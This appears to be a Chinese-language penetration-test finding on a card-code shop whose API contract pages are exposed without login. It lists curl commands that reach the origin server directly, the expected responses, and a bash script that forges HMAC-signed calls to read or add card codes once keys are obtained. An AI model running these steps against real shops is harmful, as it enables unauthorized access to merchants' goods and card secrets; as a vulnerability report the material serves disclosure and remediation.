# 自研卡商/寄售商城 开放 API 契约未授权公开

## 结论
/Api.php?action=help 与 /api_docs.php 两个页面都不需要任何凭据，直接返回完整开放接口契约：
- 签名算法：hash_hmac('sha256', app_key.timestamp.nonce, api_secret)
- 时间窗：timestamp 为当前 Unix 时间戳，误差 ±300 秒
- 防重放：nonce 随机字符串
- action 全量：create / update / on / off / add_cards / list / detail
- 密钥来源：用户中心 → 分站管理，可查看/重置本分站 API Key 与 API Secret
- list / detail 可查商品与卡密

help 是唯一免签 action；其余 action 只校验 app_key 与请求自带的签名，不要求登录态（带假 app_key 只回 "app_key 无效"，而不是 "未登录"）。

## 前置条件
- 目标可达（源站直连时用 --resolve 固定域名，并强制 TLS1.2）
- 无需 Cookie / 账号 / Referer / 任何入参
- 本机有 HTTP 代理时必须 --noproxy "*"

## 步骤

### 1. 取契约（免签）
```
curl.exe -sS -k --noproxy "*" --tlsv1.2 --tlsmax 1.2 \
  --resolve TARGET_DOMAIN:443:SOURCE_IP \
  "https://TARGET_DOMAIN/Api.php?action=help"
```
期望：
```
HTTP/1.1 200 OK

{"code":0,"msg":"接口帮助","data":{
  "endpoint":"https://TARGET_DOMAIN/Api.php",
  "auth":{
    "app_key":"分站管理后台生成的 API Key",
    "sign":"hash_hmac('sha256', app_key.timestamp.nonce, api_secret)",
    "timestamp":"当前 Unix 时间戳（误差±300秒）",
    "nonce":"随机字符串"
  },
  "actions":["create","update","on","off","add_cards","list","detail"]
}}
```

### 2. 判据：确认 help 是免签面，其余 action 只缺 app_key
```
curl.exe -sS -k --noproxy "*" --tlsv1.2 --tlsmax 1.2 \
  --resolve TARGET_DOMAIN:443:SOURCE_IP \
  "https://TARGET_DOMAIN/Api.php?action=list&app_key=test&timestamp=<ts>&nonce=abc&sign=deadbeef"
```
期望回到业务校验层而不是登录页：
```
{"code":1,"msg":"app_key 无效"}
```

### 3. 文档页交叉确认
```
curl.exe -sS -k --noproxy "*" --tlsv1.2 --tlsmax 1.2 \
  --resolve TARGET_DOMAIN:443:SOURCE_IP "https://TARGET_DOMAIN/api_docs.php"
```
期望 200 / 约 21KB，正文含「已支持接口：商品上架、商品下架、商品列表查询、商品详情」，以及「分站站长登录用户中心→分站管理，可查看/重置本分站的 API Key 和 API Secret」。

### 4. 拿到 app_key/api_secret 后自签调用（绕过登录态）
签名串 = app_key 与 timestamp、nonce 直接相连，无分隔符；HMAC-SHA256 的 key 是 api_secret。
```bash
APP_KEY='<app_key>'
API_SECRET='<api_secret>'
ts=$(date +%s)
nonce=$(head -c8 /dev/urandom | xxd -p)
sign=$(printf '%s%s%s' "$APP_KEY" "$ts" "$nonce" | openssl dgst -sha256 -hmac "$API_SECRET" -r | cut -d' ' -f1)
curl -sS "https://TARGET_DOMAIN/Api.php?action=list&app_key=$APP_KEY&timestamp=$ts&nonce=$nonce&sign=$sign"
```
action 换成 detail / add_cards 等，参数照 /api_docs.php。

## 失败常见原因
- 签名串顺序或分隔符错（必须是 app_key+timestamp+nonce 顺序直连）
- timestamp 用毫秒、或脚本缓存时间导致超出 ±300s
- nonce 复用
- app_key 不存在 / 分站停用
- 走了本地 HTTP 代理，结论被污染
- TLS1.3 握手被拒（需 --tlsv1.2 --tlsmax 1.2）

## 影响
信息级：单看是契约泄露，但它把"需要 app_key 才能调"的门槛降到"抄文档 + 自签"。任一 app_key/api_secret 泄露（分站站长弱口令、前端硬编码、db.php 结构泄露后配套拖库）即可未授权读写商品与卡密。